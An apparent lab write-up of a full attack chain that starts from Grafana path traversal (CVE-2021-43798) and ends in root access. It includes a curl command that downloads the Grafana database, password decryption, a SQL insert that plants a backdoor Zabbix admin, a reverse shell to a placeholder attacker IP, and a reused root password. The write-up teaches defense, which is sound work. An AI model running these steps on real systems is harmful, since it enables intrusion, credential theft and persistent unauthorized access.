---
title: "Grafana, Passwords, and Poor Life Choices: CVE-2021-43798"
date: 2025-11-14 12:00:00 +0100
categories: [Security Writeup, CVE]
tags: [grafana, cve, path-traversal, zabbix, privilege-escalation, password-reuse]
author: yuriibe
image:
  path: /writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/Expanding_Brain_Meme.jpg
---

## Disclaimer

Before my friends in legal get mad at me - **this was all done in my own lab**. Everything you're about to see has been redacted because I actually like my freedom.

Don't try this on stuff you don't own. Hacking random companies is illegal, unethical, and a great way to make new friends in prison.

Set up your own lab, break your own stuff, learn from it. That's the way.

---

## The Story

So there I was, just casually port scanning my lab environment (as one does on a Friday evening), when I spotted port 3000 open. "Oh cool, Grafana!" I thought. Little did I know I was about to speedrun my way to root access faster than you can say "defense in depth."

**The TL;DR:**

1. Found a Grafana with CVE-2021-43798 (path traversal)
2. Read some files I definitely shouldn't have been able to read
3. Got a secret key (spoiler: it wasn't that secret)
4. Decrypted ALL the passwords
5. Logged into Grafana like I owned the place
6. Used SQL execution
7. Created a backdoor admin account
8. Got a reverse shell
9. Found out everyone was using the same password
10. Became root

**Times I said "no way that worked":** Too many to count
**Lessons learned:** Password reuse is a hell of a drug

---

## Part 1: Background

### What is Grafana?

Grafana is basically this pretty web interface that makes graphs and dashboards for monitoring stuff. Sysadmins love it because it makes their metrics look cool. Attackers love it because it usually has credentials for literally everything it monitors.

Think of it as the keys to the kingdom, except the keys are in a glass box with "break in case of emergency" written on it, and CVE-2021-43798 is the hammer.

### Path Traversal 101

Path traversal is when you can use `../` to navigate up directories and read files you shouldn't be able to.

```bash
# Normal request
GET /files/user123/document.pdf

# Spicy request
GET /files/../../../etc/passwd
```

The second one tries to go up three directories and read `/etc/passwd`. If the application doesn't properly validate the path... well, you get to read stuff you shouldn't.

---

## Part 2: Finding the Vulnerability

### Testing for CVE-2021-43798

The vulnerability exists in Grafana versions 8.0.0 through 8.3.0. The plugin loading mechanism didn't properly validate file paths, so we can just ask nicely for files.

![path traversal proof](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image.png)

**And just like that, we're reading `/etc/passwd`!**

The server just gave it to me. No authentication, no nothing. Just "here's a system file, hope you have a great day!"

---

## Part 3: Secret Key Hunting

### Grabbing grafana.ini

Every Grafana instance has a configuration file at `/etc/grafana/grafana.ini`. This file is chef's kiss because it contains:

- The secret key used for encryption
- Database configuration
- Admin credentials (sometimes)
- Other juicy config details

![grafana.ini contents](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%201.png)

**BINGO!** Look at that beautiful secret key just sitting there. This is the encryption key Grafana uses to "protect" sensitive data like database passwords.

```ini
[security]
secret_key = [REDACTED]
admin_user = admin
admin_password = admin

[database]
type = sqlite3
path = grafana.db
```

The secret key is literally the master key to decrypt everything. It's like finding the password to the password manager.

![Guy tapping head meme](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/Guy_tapping_head_meme.jpg)

---

## Part 4: Database Heist

### Stealing grafana.db

Grafana stores everything in a SQLite database. Users, data sources, dashboards, encrypted passwords - it's all in there.

```bash
curl --path-as-is \
  "http://[TARGET]/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" \
  -o grafana.db
```

**Got it!** Now we have a complete dump of the Grafana database sitting on our attacker machine.

### Exploring the Database

```bash
sqlite3 grafana.db
```

```sql
.tables
SELECT * FROM data_source;
```

The `data_source` table is where things get interesting. Each row contains: data source name, type (MySQL, PostgreSQL, etc.), connection URL, username, and an **encrypted password**.

Example entry:

```json
{
  "password": "RLA==",
  "database": "zabbix"
}
```

---

## Part 5: Breaking the "Encryption"

### How Grafana "Secures" Passwords

Grafana uses AES-256-CFB encryption with the secret key to protect data source passwords. The format is:

```
base64(IV + encrypted_data)
```

Sounds secure, right? It's only as secure as your secret key. And guess what we already have?

### The Easy Way: Web Tool

**[Grafana Key Decryptor](https://keydecryptor.com/decryption-tools/grafana)**

Just paste in your encrypted password hash, the secret key from grafana.ini, click decrypt, watch the password appear in plaintext.

![decrypted password](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%203.png)

**Success!** The passwords just fell out. Like digital candy from a pinata.

---

## Part 6: Going Full Auto

### The Automated Approach

**[pedrohavay exploit script](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798)**

```bash
git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798
cd exploit-grafana-CVE-2021-43798
python3 exploit.py
```

![exploit script](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%204.png)

The tool automatically tests for the vulnerability, downloads important files, extracts the secret key, decrypts all passwords, and gives you a nice report.

---

## Part 7: Admin Access Unlocked

With the decrypted credentials:

- URL: `http://[TARGET]:3000/login`
- Username: `admin`
- Password: `[REDACTED]`

![grafana login success](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%205.png)

**I'm in!**

---

## Part 8: SQL Execution

### Discovering the MySQL Data Source

Grafana has this neat feature where admin users can execute SQL queries through data sources. It's not a bug, it's a feature! (It's also a massive security risk if you get compromised.)

I found a MySQL data source connected to a **Zabbix** database. Zabbix is a monitoring platform that monitors servers, network devices, applications - basically everything in your infrastructure.

**Zabbix databases contain:** user accounts and passwords, monitored host information, network topology, scripts that can be executed, and stored credentials for accessing monitored systems.

### Creating a Query Panel

![new dashboard panel](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%206.png)

![query editor](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%207.png)

```sql
SELECT @@version;
```

![version query](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%208.png)

Result: `10.3.39-MariaDB-0+deb10u2`

```sql
SELECT DATABASE();
```

![database query](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%209.png)

Result: `zabbix`

**Confirmed SQL execution on a Zabbix database.**

---

## Part 9: Zabbix Database Spelunking

### Extracting User Accounts

```sql
SELECT userid, alias, name, passwd, roleid FROM users;
```

This query dumped user accounts with bcrypt password hashes. But I don't need to crack them - I can just create my own admin account!

### Creating a Backdoor Admin

**Step 1 - Generate a password hash:**

```bash
php -r "echo password_hash('MySecurePassword', PASSWORD_BCRYPT);"
```

**Step 2 - Insert the backdoor user:**

```sql
INSERT INTO users (
  userid, alias, name, surname, passwd,
  autologin, lang, refresh, theme,
  rows_per_page, timezone, roleid
)
VALUES (
  123, 'superAdmin', 'Network', 'Monitor',
  '$2a$15$[HASH_VALUE]',
  0, 'en_GB', '30s', 'America/Belize', 50, 'UTC', 3
);
```

![insert backdoor](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%2010.png)

**Verification:**

```sql
SELECT userid, alias, name, passwd FROM users WHERE userid = 123;
```

![verify backdoor](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%2011.png)

Username: `superAdmin`, Password: `MySecurePassword`, Role: Super Admin (roleid = 3)

---

## Part 10: Zabbix Access

With my shiny new backdoor account, I headed over to the Zabbix web interface.

![zabbix dashboard](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%2012.png)

The Scripts section is where Zabbix admins can create scripts to run on monitored systems. It's meant for automation and troubleshooting. It's also perfect for getting a reverse shell.

---

## Part 11: Getting a Shell

### Creating a Reverse Shell Script

Navigation: `Administration -> Scripts -> Create Script`

![create script](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%2013.png)

**Configuration:**

```
Name: system_check
Type: Script
Execute on: Zabbix server
Commands: sh -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1
```

**Setting up the listener:**

```bash
nc -lvnp 4444
```

---

## Part 12: Shell Access

![shell as zabbix](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%2014.png)

**Shell as the `zabbix` user on the monitoring server.**

- Remote shell: done
- Access to monitoring configurations: done
- Can see all monitored infrastructure: done
- Root: not yet

---

## Part 13: The Root Speedrun

### Password Reuse to the Rescue

Remember all those passwords we decrypted earlier? Time to test if anyone committed the cardinal sin of password reuse.

```bash
zabbix@zabbix:/tmp$ su root
Password: [REDACTED - Same password as Grafana admin]
```

![root access](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/image%2015.png)

**THEY USED THE SAME PASSWORD FOR ROOT AS THEY DID FOR GRAFANA.**

I literally just typed one password and became root. No privilege escalation exploit. No kernel vulnerabilities. Just good old-fashioned password reuse.

The same password was used for:
- Grafana admin account
- MySQL database credentials
- Root system account

![expanding brain meme](/writeup-vault/security-writeups/Grafana,%20Passwords,%20and%20Poor%20Life%20Choices/screenshots/Expanding_Brain_Meme.jpg)

---

## The Attack Chain

```
[CVE-2021-43798 Path Traversal]
         |
[Read grafana.ini + grafana.db]
         |
[Extract secret key]
         |
[Decrypt all passwords]
         |
[Grafana admin access]
         |
[SQL execution]
         |
[Create backdoor in Zabbix]
         |
[Zabbix admin access]
         |
[Execute reverse shell script]
         |
[Shell as zabbix user]
         |
[Password reuse = instant root]
         |
[Complete infrastructure compromise]
```

**Number of exploits needed:** Technically just one (CVE-2021-43798)
**Everything else:** Poor security practices compounding

---

## Why This Worked

This wasn't a sophisticated APT with zero-days and custom malware. This was a textbook case of multiple things going wrong at once.

**Failure 1: Unpatched Software**
CVE-2021-43798 has been known since December 2021. Patches were available. This Grafana was still vulnerable.

**Failure 2: Weak Secret Key**
The secret key wasn't strong enough. Everything is encrypted with this key.

**Failure 3: Password Reuse**
The same password for Grafana admin, database connections, and root account. This is the big one.

**Failure 4: Too Many Privileges**
Grafana allowed arbitrary SQL execution. Zabbix allowed script execution. No restrictions.

**The point:** ANY ONE of these being fixed would have stopped or severely hampered this attack.

---

## Takeaways

1. Patch your systems - known CVEs will bite you
2. Use unique passwords - password reuse will destroy your security faster than any zero-day
3. Monitoring systems need to be secured like production systems
4. Your encryption is only as good as your key management
5. Defense in depth is not optional

---

## Resources

- **Original CVE:** CVE-2021-43798
- **Exploit Repo:** [github.com/pedrohavay/exploit-grafana-CVE-2021-43798](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798)
- **Grafana Security Advisory:** [grafana.com/blog](https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/)
